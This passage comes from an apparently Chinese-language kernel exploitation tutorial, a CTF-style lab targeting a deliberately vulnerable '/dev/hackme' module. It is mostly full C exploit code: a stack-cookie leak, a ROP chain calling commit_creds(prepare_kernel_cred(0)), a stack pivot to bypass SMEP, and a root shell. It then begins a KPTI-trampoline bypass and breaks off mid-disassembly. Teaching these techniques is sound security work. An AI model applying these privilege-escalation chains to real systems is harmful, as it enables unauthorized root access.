class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> leak[n];</span><br><span class="line">    <span class="keyword">ssize_t</span> r = read(global_fd, leak, <span class="keyword">sizeof</span>(leak));</span><br><span class="line">    cookie = leak[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaked %zd bytes\n&quot;</span>, r);</span><br><span class="line">    <span class="comment">//print_leak(leak, n);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie: %lx\n&quot;</span>, cookie);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Returned to userland&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] UID: %d, got root!\n&quot;</span>, getuid());</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] UID: %d, didn&#x27;t get root\n&quot;</span>, getuid());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_rip = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_shell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi_ret = <span class="number">0xffffffff81006370</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdx_ret = <span class="number">0xffffffff81007616</span>; <span class="comment">// pop rdx ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cmp_rdx_jne_pop2_ret = <span class="number">0xffffffff81964cc4</span>; <span class="comment">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mov_rdi_rax_jne_pop2_ret = <span class="number">0xffffffff8166fea3</span>; <span class="comment">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds = <span class="number">0xffffffff814c6410</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred = <span class="number">0xffffffff814c67f0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_pop1_ret = <span class="number">0xffffffff8100a55f</span>; <span class="comment">// swapgs ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = <span class="number">0xffffffff8100c0d9</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">overflow</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> payload[n];</span><br><span class="line">    <span class="keyword">unsigned</span> off = <span class="number">16</span>;</span><br><span class="line">    payload[off++] = cookie;</span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// r12</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbp</span></span><br><span class="line">    payload[off++] = pop_rdi_ret; <span class="comment">// return address</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rdi &lt;- 0</span></span><br><span class="line">    payload[off++] = prepare_kernel_cred; <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line">    payload[off++] = pop_rdx_ret;</span><br><span class="line">    payload[off++] = <span class="number">0x8</span>; <span class="comment">// rdx &lt;- 8</span></span><br><span class="line">    payload[off++] = cmp_rdx_jne_pop2_ret; <span class="comment">// make sure JNE doesn&#x27;t branch</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    payload[off++] = mov_rdi_rax_jne_pop2_ret; <span class="comment">// rdi &lt;- rax</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    payload[off++] = commit_creds; <span class="comment">// commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line">    payload[off++] = swapgs_pop1_ret; <span class="comment">// swapgs</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    payload[off++] = iretq; <span class="comment">// iretq frame</span></span><br><span class="line">    payload[off++] = user_rip;</span><br><span class="line">    payload[off++] = user_cs;</span><br><span class="line">    payload[off++] = user_rflags;</span><br><span class="line">    payload[off++] = user_sp;</span><br><span class="line">    payload[off++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Prepared payload&quot;</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> w = write(global_fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    save_state();</span><br><span class="line"></span><br><span class="line">    open_dev();</span><br><span class="line"></span><br><span class="line">    leak();</span><br><span class="line"></span><br><span class="line">    overflow();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>这里补充一下第二种方法，构造 fake_tty_struct ：<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/bypass-smep/">https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/bypass-smep/</a></p><hr><h4 id="情况二"><a href="#情况二" class="headerlink" title="情况二"></a>情况二</h4><p>溢出的字节只够覆盖到返回地址，和用户态 pwn 一样，需要用到栈迁移。</p><p>内核态栈迁移相比用户态要容易得多，因为可以直接通过 asm 指令来给 <code>esp</code> 赋值。</p><p>我们用工具找到了一个 gadget ，是将 esp 赋值为 0x5b000000</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mov_esp_pop2_ret = <span class="number">0xffffffff8196f56a</span>; <span class="comment">// mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret</span></span><br></pre></td></tr></table></figure><p>再通过 mmap 函数创建一个假堆栈</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_fake_stack</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    fake_stack = mmap((<span class="keyword">void</span> *)<span class="number">0x5b000000</span> - <span class="number">0x1000</span>, <span class="number">0x2000</span>, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> off = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">    fake_stack[<span class="number">0</span>] = <span class="number">0xdead</span>; <span class="comment">// put something in the first page to prevent fault</span></span><br><span class="line">    fake_stack[off++] = <span class="number">0x0</span>; <span class="comment">// dummy r12</span></span><br><span class="line">    fake_stack[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    fake_stack[off++] = pop_rdi_ret;</span><br><span class="line">    ... <span class="comment">// the rest of the chain is the same as the last payload</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里将页面映射到 0x5b000000 - 0x1000 而不是 0x5b000000，是因为 prepare_kernel_cred() 和 commit_creds() 之类的函数会调用其中的其他函数，从而导致堆栈增长。 如果我们将我们的 esp 指向页面的确切开头，那么堆栈将没有足够的空间增长并且它会崩溃。</p><p>而且我们必须在第一页(0x1000/页)中写入一个虚拟值，不然会遇到 Double Fault，之后就是和之前一样了</p><h5 id="完整exp-2"><a href="#完整exp-2" class="headerlink" title="完整exp"></a>完整exp</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc 1.c -static -masm=intel -g -o 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global_fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">open_dev</span><span class="params">()</span></span>&#123;</span><br><span class="line">    global_fd = open(<span class="string">&quot;/dev/hackme&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (global_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[!] Failed to open device&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] Opened device&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Saved state&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_leak</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *leak, <span class="keyword">unsigned</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%u: %lx\n&quot;</span>, i, leak[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cookie;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leak</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> leak[n];</span><br><span class="line">    <span class="keyword">ssize_t</span> r = read(global_fd, leak, <span class="keyword">sizeof</span>(leak));</span><br><span class="line">    cookie = leak[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaked %zd bytes\n&quot;</span>, r);</span><br><span class="line">    <span class="comment">//print_leak(leak, n);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie: %lx\n&quot;</span>, cookie);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Returned to userland&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] UID: %d, got root!\n&quot;</span>, getuid());</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] UID: %d, didn&#x27;t get root\n&quot;</span>, getuid());</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_rip = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)get_shell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi_ret = <span class="number">0xffffffff81006370</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdx_ret = <span class="number">0xffffffff81007616</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cmp_rdx_jne_pop2_ret = <span class="number">0xffffffff81964cc4</span>; <span class="comment">// cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mov_rdi_rax_jne_pop2_ret = <span class="number">0xffffffff8166fea3</span>; <span class="comment">// mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds = <span class="number">0xffffffff814c6410</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred = <span class="number">0xffffffff814c67f0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_pop1_ret = <span class="number">0xffffffff8100a55f</span>; <span class="comment">// swapgs ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = <span class="number">0xffffffff8100c0d9</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> mov_esp_pop2_ret = <span class="number">0xffffffff8196f56a</span>; <span class="comment">// mov esp, 0x5b000000 ; pop r12 ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *fake_stack;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_fake_stack</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    fake_stack = mmap((<span class="keyword">void</span> *)<span class="number">0x5b000000</span> - <span class="number">0x1000</span>, <span class="number">0x2000</span>, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> off = <span class="number">0x1000</span> / <span class="number">8</span>;</span><br><span class="line">    fake_stack[<span class="number">0</span>] = <span class="number">0xdead</span>; <span class="comment">// put something in the first page to prevent fault</span></span><br><span class="line">    fake_stack[off++] = <span class="number">0x0</span>; <span class="comment">// dummy r12</span></span><br><span class="line">    fake_stack[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    fake_stack[off++] = pop_rdi_ret;</span><br><span class="line">    fake_stack[off++] = <span class="number">0x0</span>; <span class="comment">// rdi &lt;- 0</span></span><br><span class="line">    fake_stack[off++] = prepare_kernel_cred; <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line">    fake_stack[off++] = pop_rdx_ret;</span><br><span class="line">    fake_stack[off++] = <span class="number">0x8</span>; <span class="comment">// rdx &lt;- 8</span></span><br><span class="line">    fake_stack[off++] = cmp_rdx_jne_pop2_ret; <span class="comment">// make sure JNE doesn&#x27;t branch</span></span><br><span class="line">    fake_stack[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbx</span></span><br><span class="line">    fake_stack[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    fake_stack[off++] = mov_rdi_rax_jne_pop2_ret; <span class="comment">// rdi &lt;- rax</span></span><br><span class="line">    fake_stack[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbx</span></span><br><span class="line">    fake_stack[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    fake_stack[off++] = commit_creds; <span class="comment">// commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line">    fake_stack[off++] = swapgs_pop1_ret; <span class="comment">// swapgs</span></span><br><span class="line">    fake_stack[off++] = <span class="number">0x0</span>; <span class="comment">// dummy rbp</span></span><br><span class="line">    fake_stack[off++] = iretq; <span class="comment">// iretq frame</span></span><br><span class="line">    fake_stack[off++] = user_rip;</span><br><span class="line">    fake_stack[off++] = user_cs;</span><br><span class="line">    fake_stack[off++] = user_rflags;</span><br><span class="line">    fake_stack[off++] = user_sp;</span><br><span class="line">    fake_stack[off++] = user_ss;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">overflow</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> n = <span class="number">50</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> payload[n];</span><br><span class="line">    <span class="keyword">unsigned</span> off = <span class="number">16</span>;</span><br><span class="line">    payload[off++] = cookie;</span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbx</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// r12</span></span><br><span class="line">    payload[off++] = <span class="number">0x0</span>; <span class="comment">// rbp</span></span><br><span class="line">    payload[off++] = mov_esp_pop2_ret; <span class="comment">// return address</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Prepared payload&quot;</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> w = write(global_fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    save_state();</span><br><span class="line"></span><br><span class="line">    open_dev();</span><br><span class="line"></span><br><span class="line">    leak();</span><br><span class="line"></span><br><span class="line">    build_fake_stack();</span><br><span class="line"></span><br><span class="line">    overflow();</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[!] Should never be reached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="添加-KPTI"><a href="#添加-KPTI" class="headerlink" title="添加 KPTI"></a>添加 KPTI</h3><p>内核页表隔离，完全分离用户态和内核态。系统存有两种页表，一种页表包含所有的用户空间地址与内核空间地址，仅能在内核态使用；一种页表包含用户空间地址和小部分内核地址，只在用户态使用。</p><p>开启了 KPTI 保护后，之前的方法都会失效，报错类型均为 segment fault</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/kernel-pwn/1650013183975635/6c60d9446bb016f34606312b9ec5b3ca989d176e.png" alt="image-20220414212935777"></p><p>这说明我们已经返回了用户态，但是由于我们使用的 gadget 所属的页表仍处于内核态，所以无法执行。</p><p>有两种方法来绕过 KPTI 保护：</p><ul><li>利用 segment fault，段异常错误，系统发生异常时会去寻找异常处理函数，可以使用 signal handler 复写 segment fault 对应的异常处理函数，通过 signal(SIGSEGV, get_shell) ；将其改为我们所对应的获取 shell 的函数地址，则程序发生 segment fault 时将自动执行我们指定的函数</li><li>借助 KPTI trampoline 技术，该技术基于思想：如果系统调用正常返回，那么内核中必须<strong>有一段代码将页表交换回用户态表</strong>，因此我们将尝试重用这些代码。这段代码称为KPTI trampoline，它所做的是交换页表、swapgs 和 iretq。</li></ul><p>现在主要来说说第二种，说白了就是利用一段代码构造 payload 跳到用户态：</p><p>这段代码位于一个叫 <code>swapgs_restore_regs_and_return_to_usermode()</code> 的函数中，同样可以用指令找到它的地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms | grep swapgs_restore_regs_and_return_to_usermode</span><br><span class="line">-&gt; ffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode</span><br></pre></td></tr></table></figure><p>反汇编结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF81200F10                 pop     r15</span><br><span class="line">.text:FFFFFFFF81200F12                 pop     r14</span><br><span class="line">.text:FFFFFFFF81200F14                 pop     r13</span><br><span class="line">.text:FFFFFFFF81200F16                 pop     r12</span><br><span class="line">.text:FFFFFFFF81200F18                 pop     rbp</span><br><span class="line">.text:FFFFFFFF81200F19                 pop     rbx</span><br><span class="line">.text:FFFFFFFF81200F1A                 pop     r11</span><br><span class="line">.text:FFFFFFFF81200F1C                 pop     r10</span><br><span class="line">.text:FFFFFFFF81200F1E                 pop     r9</span><br><span class="line">.text:FFFFFFFF81200F20                 pop     r8</span><br><span class="line">.text:FFFFFFFF81200F22                 pop     rax</span><br><span class="line">.text:FFFFFFFF81200F23                 pop     rcx</span><br><span class="line">.text:FFFFFFFF81200F24                 pop     rdx</span><br><span class="line">.text:FFFFFFFF81200F25                 pop     rsi</span><br><span class="line">.text:FFFFFFFF81200F26                 mov     rdi, rsp</span><br><span class="line">.text:FFFFFFFF81200F29                 mov     rsp, qword ptr gs:unk_6004</span><br><span class="line">.text:FFFFFFFF81200F32                 push    qword ptr [rdi+30h]</span><br><span class="line">.text:FFFFFFFF81200F35                 push    qword ptr [rdi+28h]</span><br><span class="line">.text:FFFFFFFF81200F38                 push    qword ptr [rdi+20h]</span><br><span class="line">.text:FFFFFFFF81200F3B                 push    qword ptr [rdi+18h]</span><br><span class="line">.text:FFFFFFFF81200F3E                 push    qword ptr [rdi+10h]</span><br><span class="line">.text:FFFFFFFF81200F41                 push    qword ptr [rdi]</span><br><span class="line">.text:FFFFFFFF81200F43                 push    rax</span><br><span class="line">.text:FFFFFFFF81200F44                 jmp     short loc_FFFFFFFF81200F89</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>只需要关注它交换页表、swapgs 和 iretq 的部分，也就是 <code>swapgs_restore_regs_and_return_to_usermode + 22</code> ，即第一个 mov 的位置。</p><p>然后就是最重要的部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:FFFFFFFF81200F89 loc_FFFFFFFF81200F89:</span><br><span 